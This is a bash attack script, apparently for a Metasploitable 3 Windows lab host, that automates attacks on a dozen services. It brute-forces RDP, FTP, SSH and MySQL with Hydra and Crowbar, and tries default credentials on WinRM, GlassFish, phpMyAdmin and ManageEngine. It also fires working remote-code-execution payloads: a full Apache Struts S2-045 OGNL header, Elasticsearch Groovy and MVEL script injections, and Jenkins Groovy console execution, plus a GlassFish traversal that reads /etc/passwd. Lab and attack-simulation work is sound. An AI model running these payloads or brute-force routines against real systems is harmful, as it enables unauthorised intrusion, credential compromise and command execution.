#!/bin/bash
###############################################################################
# Windows Attack Script (Metasploitable 3 Windows - 10.10.40.21)
# Original: RDP brute force, IIS scanning, WinRM enumeration, EternalBlue
# Expanded: FTP, SSH, MySQL, GlassFish, Struts, Jenkins, WAMP,
#           Elasticsearch, ManageEngine
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.21}"
TARGET_PORT="${3:-3389}"
RESULTS_DIR="${4:-.}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLISTS_DIR="${SCRIPT_DIR}/wordlists"
WIN_USERS="${WORDLISTS_DIR}/windows_users.txt"
MS3_USERS="${WORDLISTS_DIR}/ms3_users.txt"
MS3_PASSWORDS="${WORDLISTS_DIR}/ms3_passwords.txt"

# Source configs for expanded port variables
source "${SCRIPT_DIR}/configs/targets.conf" 2>/dev/null || true

mkdir -p "$RESULTS_DIR"

echo "[*] Windows attacks: $SUBTYPE against ${TARGET_IP}"

run_rdp_brute() {
    echo "[*] RDP brute force"

    # Nmap RDP detection
    nmap -p 3389 --script=rdp-enum-encryption,rdp-ntlm-info \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_rdp.txt" 2>&1 || true

    # Hydra RDP brute force
    if command -v hydra &>/dev/null; then
        echo "[*] Hydra RDP brute force..."
        local user_file="$WIN_USERS"
        [[ ! -f "$user_file" ]] && user_file="${WORDLISTS_DIR}/small_users.txt"

        hydra -L "$user_file" \
              -P "${WORDLISTS_DIR}/small_passwords.txt" \
              -t 4 -f \
              "${TARGET_IP}" rdp 2>&1 | tee "${RESULTS_DIR}/rdp_brute.txt" || true
    fi

    # Crowbar RDP brute force (if available)
    if command -v crowbar &>/dev/null; then
        echo "[*] Crowbar RDP brute force..."
        crowbar -b rdp -s "${TARGET_IP}/32" \
            -U "${WORDLISTS_DIR}/small_users.txt" \
            -C "${WORDLISTS_DIR}/small_passwords.txt" \
            -n 4 2>&1 | tee "${RESULTS_DIR}/rdp_crowbar.txt" || true
    fi

    echo "[+] RDP brute force complete"
}

run_iis_scan() {
    echo "[*] IIS vulnerability scanning"

    # Nmap IIS scripts
    nmap -p 80,8080 --script=http-iis-webdav-vuln,http-iis-short-name-brute \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_iis.txt" 2>&1 || true

    # Nikto against IIS
    if command -v nikto &>/dev/null; then
        nikto -h "$TARGET_IP" -p 80 \
            -Format txt -output "${RESULTS_DIR}/nikto_iis.txt" \
            -maxtime 300 2>&1 || true
    fi

    # IIS-specific path probes
    echo "[*] IIS path enumeration..."
    local paths=(
        "/_vti_bin/shtml.dll" "/_vti_bin/_vti_aut/author.dll"
        "/iisadmpwd/aexp.htr" "/iisadmpwd/aexp2.htr"
        "/scripts/iisadmin/ism.dll" "/scripts/tools/newdsn.exe"
        "/trace.axd" "/elmah.axd" "/.aspx" "/web.config"
        "/aspnet_client/" "/App_Data/" "/bin/"
        "/iisstart.htm" "/IISHelp/" "/_layouts/"
    )

    for path in "${paths[@]}"; do
        curl -sk "http://${TARGET_IP}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/iis_paths.txt" 2>&1 || true
        sleep 0.3
    done

    # WebDAV methods testing
    echo "[*] Testing WebDAV methods..."
    curl -sk -X OPTIONS "http://${TARGET_IP}/" \
        -o /dev/null -D - \
        > "${RESULTS_DIR}/iis_options.txt" 2>&1 || true

    curl -sk -X PROPFIND "http://${TARGET_IP}/" \
        -H "Depth: 1" \
        > "${RESULTS_DIR}/iis_propfind.txt" 2>&1 || true

    echo "[+] IIS scanning complete"
}

run_winrm() {
    echo "[*] WinRM enumeration"

    # Check WinRM port
    nmap -p 5985,5986 -sV "$TARGET_IP" \
        -oN "${RESULTS_DIR}/nmap_winrm.txt" 2>&1 || true

    # Try WinRM authentication
    echo "[*] Testing WinRM credentials..."
    local creds=("administrator:password" "vagrant:vagrant" "admin:admin"
                 "administrator:P@ssw0rd" "administrator:vagrant")

    for cred in "${creds[@]}"; do
        user="${cred%%:*}"
        pass="${cred#*:}"
        echo "[*] Trying: ${user}:${pass}"

        # evil-winrm if available
        if command -v evil-winrm &>/dev/null; then
            timeout 10 evil-winrm -i "$TARGET_IP" -u "$user" -p "$pass" \
                -c "whoami" 2>&1 | head -5 \
                >> "${RESULTS_DIR}/winrm_attempts.txt" || true
        fi

        # curl-based WSMAN probe
        curl -sk "http://${TARGET_IP}:5985/wsman" \
            -u "${user}:${pass}" \
            --ntlm \
            -o /dev/null -w "  ${user}:${pass} -> %{http_code}\n" \
            >> "${RESULTS_DIR}/winrm_attempts.txt" 2>&1 || true
        sleep 1
    done

    echo "[+] WinRM enumeration complete"
}

run_smb_ms17() {
    echo "[*] EternalBlue (MS17-010) scanning"

    # Nmap MS17-010 check
    nmap -p 445 --script=smb-vuln-ms17-010 \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_ms17.txt" 2>&1 || true

    # Additional SMB vulnerability checks
    nmap -p 445 --script=smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_smb_vulns.txt" 2>&1 || true

    # SMB version enumeration
    nmap -p 445 --script=smb-protocols,smb2-security-mode \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_smb_version.txt" 2>&1 || true

    echo "[+] EternalBlue scanning complete"
}

###############################################################################
# EXPANDED MS3 SERVICES
###############################################################################

run_ftp_brute() {
    local ftp_port="${WINDOWS_FTP_PORT:-21}"
    echo "[*] FTP brute force against ${TARGET_IP}:${ftp_port}"

    # Nmap FTP scripts
    nmap -p "$ftp_port" --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_ftp.txt" 2>&1 || true

    # Hydra FTP brute force
    if command -v hydra &>/dev/null; then
        local user_file="$MS3_USERS"
        [[ ! -f "$user_file" ]] && user_file="${WORDLISTS_DIR}/small_users.txt"
        local pass_file="$MS3_PASSWORDS"
        [[ ! -f "$pass_file" ]] && pass_file="${WORDLISTS_DIR}/small_passwords.txt"

        echo "[*] Hydra FTP brute force..."
        hydra -L "$user_file" \
              -P "$pass_file" \
              -t 4 -f \
              -s "$ftp_port" \
              "${TARGET_IP}" ftp 2>&1 | tee "${RESULTS_DIR}/ftp_brute.txt" || true
    fi

    echo "[+] FTP brute force complete"
}

run_ssh_brute() {
    local ssh_port="${WINDOWS_SSH_PORT:-22}"
    echo "[*] SSH brute force against ${TARGET_IP}:${ssh_port}"

    # Nmap SSH enumeration
    nmap -p "$ssh_port" --script=ssh2-enum-algos,ssh-auth-methods \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_ssh.txt" 2>&1 || true

    # Banner grab
    nmap -p "$ssh_port" -sV "$TARGET_IP" \
        -oN "${RESULTS_DIR}/ssh_version.txt" 2>&1 || true

    # Hydra SSH brute force
    if command -v hydra &>/dev/null; then
        local user_file="$MS3_USERS"
        [[ ! -f "$user_file" ]] && user_file="${WORDLISTS_DIR}/small_users.txt"
        local pass_file="$MS3_PASSWORDS"
        [[ ! -f "$pass_file" ]] && pass_file="${WORDLISTS_DIR}/small_passwords.txt"

        echo "[*] Hydra SSH brute force..."
        hydra -L "$user_file" \
              -P "$pass_file" \
              -t 4 -f \
              -s "$ssh_port" \
              "${TARGET_IP}" ssh 2>&1 | tee "${RESULTS_DIR}/ssh_brute.txt" || true
    fi

    echo "[+] SSH brute force complete"
}

run_mysql_attack() {
    local mysql_port="${WINDOWS_MYSQL_PORT:-3306}"
    echo "[*] MySQL attacks against ${TARGET_IP}:${mysql_port}"

    # Nmap MySQL enumeration
    nmap -p "$mysql_port" --script=mysql-info,mysql-enum,mysql-databases \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_mysql.txt" 2>&1 || true

    # CVE-2012-2122 auth bypass check
    echo "[*] MySQL CVE-2012-2122 auth bypass check..."
    nmap -p "$mysql_port" --script=mysql-vuln-cve2012-2122 \
        "$TARGET_IP" -oN "${RESULTS_DIR}/mysql_cve2012.txt" 2>&1 || true

    # Credential brute force
    if command -v hydra &>/dev/null; then
        local user_file="$MS3_USERS"
        [[ ! -f "$user_file" ]] && user_file="${WORDLISTS_DIR}/small_users.txt"
        local pass_file="$MS3_PASSWORDS"
        [[ ! -f "$pass_file" ]] && pass_file="${WORDLISTS_DIR}/small_passwords.txt"

        echo "[*] Hydra MySQL brute force..."
        hydra -L "$user_file" \
              -P "$pass_file" \
              -t 4 -f \
              -s "$mysql_port" \
              "${TARGET_IP}" mysql 2>&1 | tee "${RESULTS_DIR}/mysql_brute.txt" || true
    fi

    # Common root password attempts
    echo "[*] MySQL root password guessing..."
    local root_passes=("" "root" "password" "toor" "mysql" "vagrant")
    for pass in "${root_passes[@]}"; do
        nmap -p "$mysql_port" --script=mysql-brute \
            --script-args "mysql-brute.accounts=root:${pass}" \
            "$TARGET_IP" >> "${RESULTS_DIR}/mysql_root.txt" 2>&1 || true
        sleep 0.5
    done

    echo "[+] MySQL attacks complete"
}

run_glassfish() {
    local admin_port="${WINDOWS_GLASSFISH_ADMIN_PORT:-4848}"
    local http_port="${WINDOWS_GLASSFISH_HTTP_PORT:-8080}"
    echo "[*] GlassFish attacks against ${TARGET_IP}:${admin_port}/${http_port}"

    # Admin console default creds
    echo "[*] GlassFish admin console default credential check..."
    local gf_creds=("admin:" "admin:admin" "admin:glassfish" "admin:adminadmin" "admin:changeit")
    for cred in "${gf_creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred#*:}"
        curl -sk "http://${TARGET_IP}:${admin_port}/management/domain" \
            -u "${user}:${pass}" \
            -o /dev/null -w "  ${user}:${pass} -> %{http_code}\n" \
            >> "${RESULTS_DIR}/glassfish_creds.txt" 2>&1 || true
        sleep 0.5
    done

    # REST API enumeration
    echo "[*] GlassFish REST API enumeration..."
    local gf_paths=(
        "/management/domain"
        "/management/domain/applications/application"
        "/management/domain/resources"
        "/management/domain/servers/server"
        "/management/domain/configs"
    )
    for path in "${gf_paths[@]}"; do
        curl -sk "http://${TARGET_IP}:${admin_port}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/glassfish_api.txt" 2>&1 || true
        sleep 0.3
    done

    # Deployed application listing
    echo "[*] Checking deployed applications on port ${http_port}..."
    curl -sk "http://${TARGET_IP}:${http_port}/" \
        > "${RESULTS_DIR}/glassfish_index.txt" 2>&1 || true

    # Nmap GlassFish detection
    nmap -p "${admin_port},${http_port}" -sV "$TARGET_IP" \
        -oN "${RESULTS_DIR}/nmap_glassfish.txt" 2>&1 || true

    # Directory traversal (CVE-2017-1000028)
    echo "[*] GlassFish directory traversal check..."
    curl -sk "http://${TARGET_IP}:${admin_port}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" \
        > "${RESULTS_DIR}/glassfish_traversal.txt" 2>&1 || true
    curl -sk "http://${TARGET_IP}:${admin_port}/theme/META-INF/..%5c..%5c..%5c..%5cetc/passwd" \
        >> "${RESULTS_DIR}/glassfish_traversal.txt" 2>&1 || true

    echo "[+] GlassFish attacks complete"
}

run_struts() {
    local struts_port="${WINDOWS_STRUTS_PORT:-8282}"
    echo "[*] Apache Struts attacks against ${TARGET_IP}:${struts_port}"

    # S2-045 OGNL injection via Content-Type
    echo "[*] Struts2 S2-045 Content-Type OGNL injection..."
    curl -sk "http://${TARGET_IP}:${struts_port}/" \
        -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
        > "${RESULTS_DIR}/struts_s2045.txt" 2>&1 || true

    # S2-053 Freemarker
    echo "[*] Struts2 S2-053 Freemarker template injection..."
    curl -sk "http://${TARGET_IP}:${struts_port}/" \
        -d 'name=%25%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3F(%23_memberAccess%3D%23dm)%3A((null)))%7D' \
        > "${RESULTS_DIR}/struts_s2053.txt" 2>&1 || true

    # Path enumeration
    echo "[*] Struts path enumeration..."
    local struts_paths=(
        "/" "/index.action" "/login.action" "/admin/"
        "/struts/" "/showcase/" "/showcase/index.action"
        "/devmode.action" "/config-browser/index.action"
    )
    for path in "${struts_paths[@]}"; do
        curl -sk "http://${TARGET_IP}:${struts_port}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/struts_paths.txt" 2>&1 || true
        sleep 0.3
    done

    # Nmap Struts detection
    nmap -p "$struts_port" -sV --script=http-title \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_struts.txt" 2>&1 || true

    echo "[+] Struts attacks complete"
}

run_jenkins() {
    local jenkins_port="${WINDOWS_JENKINS_PORT:-8484}"
    echo "[*] Jenkins attacks against ${TARGET_IP}:${jenkins_port}"

    # Script console access check
    echo "[*] Jenkins script console access check..."
    curl -sk "http://${TARGET_IP}:${jenkins_port}/script" \
        -o /dev/null -w "  /script: %{http_code}\n" \
        > "${RESULTS_DIR}/jenkins_console.txt" 2>&1 || true

    # API enumeration
    echo "[*] Jenkins API enumeration..."
    local jenkins_paths=(
        "/api/json"
        "/api/json?tree=jobs[name,url,color]"
        "/systemInfo"
        "/script"
        "/asynchPeople/"
        "/computer/api/json"
        "/pluginManager/api/json?depth=1"
        "/credentials/"
        "/configureSecurity/"
        "/manage"
    )
    for path in "${jenkins_paths[@]}"; do
        curl -sk "http://${TARGET_IP}:${jenkins_port}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/jenkins_api.txt" 2>&1 || true
        sleep 0.3
    done

    # Groovy script execution attempt (if console accessible)
    echo "[*] Jenkins Groovy script execution attempt..."
    curl -sk "http://${TARGET_IP}:${jenkins_port}/script" \
        -d 'script=println("whoami".execute().text)' \
        > "${RESULTS_DIR}/jenkins_groovy.txt" 2>&1 || true

    # Anonymous access check
    echo "[*] Jenkins anonymous read check..."
    curl -sk "http://${TARGET_IP}:${jenkins_port}/" \
        > "${RESULTS_DIR}/jenkins_index.txt" 2>&1 || true

    # Nmap Jenkins detection
    nmap -p "$jenkins_port" -sV --script=http-title \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_jenkins.txt" 2>&1 || true

    echo "[+] Jenkins attacks complete"
}

run_wamp() {
    local wamp_port="${WINDOWS_WAMP_PORT:-8585}"
    echo "[*] WAMP/phpMyAdmin attacks against ${TARGET_IP}:${wamp_port}"

    # phpMyAdmin default creds
    echo "[*] phpMyAdmin default credential check..."
    local pma_creds=("root:" "root:root" "root:password" "root:mysql" "admin:admin" "pma:")
    for cred in "${pma_creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred#*:}"
        curl -sk "http://${TARGET_IP}:${wamp_port}/phpmyadmin/" \
            -d "pma_username=${user}&pma_password=${pass}&server=1" \
            -o /dev/null -w "  pma ${user}:${pass} -> %{http_code}\n" \
            >> "${RESULTS_DIR}/wamp_pma_creds.txt" 2>&1 || true
        sleep 0.5
    done

    # WAMP path enumeration
    echo "[*] WAMP path enumeration..."
    local wamp_paths=(
        "/" "/phpmyadmin/" "/phpMyAdmin/"
        "/phpinfo.php" "/info.php" "/test.php"
        "/server-status" "/server-info"
        "/icons/" "/cgi-bin/"
    )
    for path in "${wamp_paths[@]}"; do
        curl -sk "http://${TARGET_IP}:${wamp_port}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/wamp_paths.txt" 2>&1 || true
        sleep 0.3
    done

    # Nikto scan
    if command -v nikto &>/dev/null; then
        echo "[*] Nikto scan against WAMP..."
        nikto -h "$TARGET_IP" -p "$wamp_port" \
            -Format txt -output "${RESULTS_DIR}/nikto_wamp.txt" \
            -maxtime 180 2>&1 || true
    fi

    echo "[+] WAMP attacks complete"
}

run_elasticsearch() {
    local es_port="${WINDOWS_ELASTICSEARCH_PORT:-9200}"
    echo "[*] Elasticsearch attacks against ${TARGET_IP}:${es_port}"

    # Cluster health and info
    echo "[*] Elasticsearch cluster info..."
    curl -sk "http://${TARGET_IP}:${es_port}/" \
        > "${RESULTS_DIR}/es_info.txt" 2>&1 || true
    curl -sk "http://${TARGET_IP}:${es_port}/_cluster/health?pretty" \
        > "${RESULTS_DIR}/es_health.txt" 2>&1 || true

    # Index listing
    echo "[*] Elasticsearch index enumeration..."
    curl -sk "http://${TARGET_IP}:${es_port}/_cat/indices?v" \
        > "${RESULTS_DIR}/es_indices.txt" 2>&1 || true
    curl -sk "http://${TARGET_IP}:${es_port}/_aliases?pretty" \
        >> "${RESULTS_DIR}/es_indices.txt" 2>&1 || true

    # Node info
    echo "[*] Elasticsearch node enumeration..."
    curl -sk "http://${TARGET_IP}:${es_port}/_nodes?pretty" \
        > "${RESULTS_DIR}/es_nodes.txt" 2>&1 || true

    # Search queries
    echo "[*] Elasticsearch search queries..."
    curl -sk "http://${TARGET_IP}:${es_port}/_search?pretty&size=5" \
        > "${RESULTS_DIR}/es_search.txt" 2>&1 || true
    curl -sk "http://${TARGET_IP}:${es_port}/_all/_search?pretty&size=5" \
        >> "${RESULTS_DIR}/es_search.txt" 2>&1 || true

    # Groovy script RCE (CVE-2015-1427)
    echo "[*] Elasticsearch Groovy RCE check (CVE-2015-1427)..."
    curl -sk "http://${TARGET_IP}:${es_port}/_search?pretty" \
        -H "Content-Type: application/json" \
        -d '{"size":1,"script_fields":{"lupin":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}' \
        > "${RESULTS_DIR}/es_cve2015_1427.txt" 2>&1 || true

    # MVEL script RCE attempt
    echo "[*] Elasticsearch MVEL script check..."
    curl -sk "http://${TARGET_IP}:${es_port}/_search?pretty" \
        -H "Content-Type: application/json" \
        -d '{"size":1,"script_fields":{"mvel":{"script":"import java.util.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()","lang":"mvel"}}}' \
        > "${RESULTS_DIR}/es_mvel.txt" 2>&1 || true

    # Nmap Elasticsearch detection
    nmap -p "$es_port" -sV "$TARGET_IP" \
        -oN "${RESULTS_DIR}/nmap_elasticsearch.txt" 2>&1 || true

    echo "[+] Elasticsearch attacks complete"
}

run_manageengine() {
    local me_port="${WINDOWS_MANAGEENGINE_PORT:-8020}"
    echo "[*] ManageEngine attacks against ${TARGET_IP}:${me_port}"

    # Default credential check
    echo "[*] ManageEngine default credential check..."
    local me_creds=("admin:admin" "administrator:administrator" "guest:guest")
    for cred in "${me_creds[@]}"; do
        local user="${cred%%:*}"
        local pass="${cred#*:}"
        curl -sk "http://${TARGET_IP}:${me_port}/j_security_check" \
            -d "j_username=${user}&j_password=${pass}" \
            -o /dev/null -w "  ${user}:${pass} -> %{http_code}\n" \
            >> "${RESULTS_DIR}/me_creds.txt" 2>&1 || true
        sleep 0.5
    done

    # API enumeration
    echo "[*] ManageEngine API enumeration..."
    local me_paths=(
        "/" "/index.do" "/showlogin.do"
        "/api/json/admin/getServerInfo"
        "/api/json/admin/getAgentsList"
        "/servlet/FailOverHelperServlet"
        "/ServerStatusServlet"
        "/StatusUpdate"
    )
    for path in "${me_paths[@]}"; do
        curl -sk "http://${TARGET_IP}:${me_port}${path}" \
            -o /dev/null -w "  ${path}: %{http_code}\n" \
            >> "${RESULTS_DIR}/me_api.txt" 2>&1 || true
        sleep 0.3
    done

    # CVE-2020-10189 deserialization check
    echo "[*] CVE-2020-10189 deserialization endpoint check..."
    curl -sk "http://${TARGET_IP}:${me_port}/servlet/FailOverHelperServlet" \
        -X POST \
        -o /dev/null -w "  deser_check: %{http_code}\n" \
        > "${RESULTS_DIR}/me_cve2020.txt" 2>&1 || true

    # Nmap ManageEngine detection
    nmap -p "$me_port" -sV --script=http-title \
        "$TARGET_IP" -oN "${RESULTS_DIR}/nmap_manageengine.txt" 2>&1 || true

    echo "[+] ManageEngine attacks complete"
}

###############################################################################
# MAIN DISPATCH
###############################################################################

case "$SUBTYPE" in
    rdp_brute)      run_rdp_brute ;;
    iis_scan)       run_iis_scan ;;
    winrm)          run_winrm ;;
    smb_ms17)       run_smb_ms17 ;;
    ftp_brute)      run_ftp_brute ;;
    ssh_brute)      run_ssh_brute ;;
    mysql_attack)   run_mysql_attack ;;
    glassfish)      run_glassfish ;;
    struts)         run_struts ;;
    jenkins)        run_jenkins ;;
    wamp)           run_wamp ;;
    elasticsearch)  run_elasticsearch ;;
    manageengine)   run_manageengine ;;
    full)
        run_rdp_brute
        sleep 5
        run_iis_scan
        sleep 5
        run_winrm
        sleep 5
        run_smb_ms17
        sleep 5
        run_ftp_brute
        sleep 5
        run_ssh_brute
        sleep 5
        run_mysql_attack
        sleep 5
        run_glassfish
        sleep 5
        run_struts
        sleep 5
        run_jenkins
        sleep 5
        run_wamp
        sleep 5
        run_elasticsearch
        sleep 5
        run_manageengine
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: rdp_brute, iis_scan, winrm, smb_ms17, ftp_brute, ssh_brute, mysql_attack, glassfish, struts, jenkins, wamp, elasticsearch, manageengine, full"
        exit 1
        ;;
esac

echo "[*] Windows attack script complete"
